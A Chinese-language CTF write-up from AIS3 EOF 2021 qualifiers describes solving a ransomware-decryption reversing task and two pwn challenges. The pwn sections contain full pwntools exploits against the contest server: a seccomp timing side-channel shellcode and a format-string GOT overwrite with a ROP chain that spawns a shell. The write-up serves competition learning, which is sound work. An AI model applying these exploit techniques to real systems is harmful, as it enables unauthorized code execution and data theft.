---
title: 'EOF2021 Quals Write-Up' 
author: "TwinkleStar03"
tags: [AIS3 EOF 2021, Write-Up]
categories: [CTF]
date: 2021-01-20
description: AIS3 EOF 2021 初賽解題過程與心得。
---

第一次參加AIS3 EOF，這次是與其他隊的人一起合組CTF2NOP。
腦袋燒了兩天還是沒能把Pwn敲完，離All Kill還差了兩題...

還有許多可以檢討跟進步的地方，這邊放上自己有參與解題的題目所經過的解題過程。

---

## CTF2NOP 解題概觀
✅ = 有將過程寫在內文
- Web
  - Zero Storage Flag A
  - Zero Storage Flag B
  - CYBERPUNK 1977
- Reverse
  - abexcm100
  - AssemblyLanguageBeast
  - Jwangs Terminal
  - DuRaRaRa
  - ransomeware ✅
- Pwn
  - EDUshell ✅
  - Illusion ✅
  - Messy printer

## Reverse

### ransomeware
先找到針對檔案進行加密的Function。

![](https://i.imgur.com/oq6Crb4.png)

可以看出來是做了XOR Encryption，XOR Key可以直接從data段裏頭拉出來，但xor開始的位置是由原始檔案的資訊來決定的。

此外，還會將最終檔案填充至4096個bytes。

由於原始檔案未知，所以寫了個Decoder來爆搜Encryption開始的位置，並寫了vaildator來決定這個檔案是不是正確的。

那vaildator有兩種，分別是.txt跟.jpg。
前者在decode過程中檢查是否全都是printable，如果是才繼續decode。
後者則是檢查jpg的file magic，如果符合才繼續decode。

`decoder.py` :
```python
from string import printable


magic_seq, checked = [], False
printable_chars = bytes(printable + '\x00', 'ascii')
key = list(map(lambda x: int(f'0x{x}', 16), open('./key.txt').read().split()))
print('Key loaded.')


def decrypt(arr, off, validator):
    ret = []
    checked = False
    for x in range(len(arr)):
        org = bytes([ arr[x] ^ key[(x + off) % len(key)] ])
        
        if not validator(org):
            return (False, None)
        
        if org != b'\x00':
            ret.append(org)

    return (True, ret)

def is_printable(x):
    return True if x in printable_chars else False

def check_magic(x):
    magic_seq.append(x)
    if len(magic_seq) == 12 and not checked:
        checked = True
        magic_seq = []
        if magic_seq != bytes.fromhex('FFD8FFE000104A4649460001'):
            return False

    return True

cipher = open('./readme.txt', 'rb').read()
for i in range(len(key)):
    status, ret = decrypt(cipher, i, is_printable)

    if status:
        print(f'Offset {hex(i)} FOUND! file dumped.')
        out = open(f'./out{hex(i)}.txt', 'wb+')
        for e in ret:
            out.write(e)
        out.close()
        exit(0)

print('Offset not found...')

```

全都解完會得到143張jpg檔，依照readme所要求的用檔案大小排序並把圖片拼回來。

`concat.py` :
```python
def split(v,sz):
    return [v[i:i+sz] for i in range(0,len(v),sz)]

def merge(images,ih):
    iw = 1-ih
    ws, hs = zip(*(i.size for i in images))
    nw = [sum(ws), max(ws)][iw]
    nh = [sum(hs), max(hs)][ih]
    new_im = Image.new('RGB', (nw,nh))
    x_offset = 0
    y_offset = 0
    for im in images:
        new_im.paste(im, (x_offset,y_offset))
        x_offset += im.size[0]*ih
        y_offset += im.size[1]*iw
    return new_im

def rearrange_images():
    images = [f'./decrypt/{i}.jpg' for i in range(1,144)]
    images = [(os.path.getsize(x),x)  for x in images]
    images = sorted(images)[::-1]
    images = [Image.open(x) for _,x in images]
    images = split(images,11)
    images = [merge(x,1) for x in images]
    images = merge(images,0)
    images.save('flag.jpg')

rearrange_images()
```

最終的圖片:
![](https://i.imgur.com/TqCLXIC.png)


## Pwn

### EDUshell
`load_flag`，會將flag讀到bss段，並設置Seccomp。

![EDUshell_load_flag](https://i.imgur.com/Gpk9DZr.png)

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW  
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```
Seccomp上完後就就不會有Output了。

`exec`會mmap一塊RWX的memory，會讀完input後jmp上去執行。
![EDUshell_exec](https://i.imgur.com/Nwy9dqu.png)

無回顯、可以執行任意Shellcode。用Side-channel Attack。
把bss上的flag逐一字元抓出來比較，如果對了就讀到Timeout、錯了就直接Crash掉Process。

Exp:
```python
from pwn import 
from string import printable


context.arch = 'amd64'

def OuO(alpha, offset):
    global p 
    p = remote('eofqual.zoolab.org', 10101)

    p.sendlineafter('$ ', 'loadflag')
    payload = asm('''
        mov rax, qword ptr [rbp+0x8] 
        sub rax, 0xFFFFFFFFFFFFD733
        mov cl, byte ptr [rax+{}]
        cmp cl, {}
        
    n:
        je y
        push 0x0xFFFFFFFFFFFFFFFF
        ret
        
    y:
        ret
    '''.format(hex(offset), ord(alpha)))

    p.sendline('exec '.encode() + payload)
    try:
        p.recv(timeout = 1)
        
    except:
        return False
    
    return True

if __name__ == '__main__':
    flag, idx = 'FLAG{', 5
    try:
        while True:
            for a in printable:
                if OuO(a, idx):
                    flag += a
                    if a == '}':
                        success(f'Flag FOUND! : {flag}')
                        exit()

                    idx += 1
                    success(f'Success! Now Flag: {flag}')
                    break
    except:
        info('Exiting...')

```

### Illusion
從Local看的話可以發現有個沒用的Buffer overflow。因為printf會自動在字串後面加上`\x00`，然後puts讀到`\x00`才停下。
沒辦法Information leak。

![Illusion_main](https://i.imgur.com/9WaKtU6.png)

Local看不出個所以然，所以就轉移到remote隨便試試看。
送個%p居然丟了Address給我，所以我猜remote的環境在不明原因下puts跟printf對調了。


因為有PIE，所以先Fmt Leak。然後Binary是Partial RELRO，GOT可寫。
算出gadgets的位置後，在Stack上放好ROP Chain，再修改`exit@got.plt`想辦法控制Stack Pointer到ROP Chain上。
Exp:
```python
from pwn import *


#p = process('/home/Illusion/illusion')
p = remote('eofqual.zoolab.org', 10104)

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')

p.sendlineafter('?\n', 'STAR%15$p|%11$p')
p.recvuntil('STAR')
leak = p.recvline()[:-1].split(b'|')
code_leak = int(leak[0], 16)
libc_leak = int(leak[1], 16)

libc_base = libc_leak - (libc.sym['__libc_start_main'] + 243)
code_base = code_leak - 0x1211
exit_got = code_base + 0x5018

# Gadgets
# @Libc
system = libc_base + 0x55410
bin_sh = libc_base + 0x1b75aa

# @Chall
pop_r15_ret = code_base + 0x2bd2
pop_rdi_ret = code_base + 0x2bd3
ret = code_base + 0x101a

print(f'Leak : {list(map(lambda x : hex(int(x, 16)), leak))}')
info(f'Libc base : {hex(libc_base)}')
info(f'Code base : {hex(code_base)}')
info(f'system @ libc : {hex(system)}')
info(f'GOT of exit : {hex(exit_got)}')

# Hijack exit's GOT to run main again.
payload = '%{}c%22$hn'.format( (code_base + 0x1211) & 0xffff ).ljust(0x80, 'A').encode() + p64(exit_got)
p.sendlineafter('?\n', payload)
p.recvuntil('bye\n')

# Hijack exit@plt.got to pop_r15_ret and setup rop chain to open shell
info('Stacking ROPchain.')
payload = '%{}c%28$hn'.format( (pop_r15_ret) & 0xffff ).encode() 
p.sendlineafter('?\n', payload)

rop_chain = b''.join([
    p64(pop_rdi_ret),
    p64(bin_sh),
    p64(system),
])
print(hexdump(rop_chain))
p.sendlineafter('?\n', rop_chain)

success('Spawning a shell. OuO')
p.interactive()
```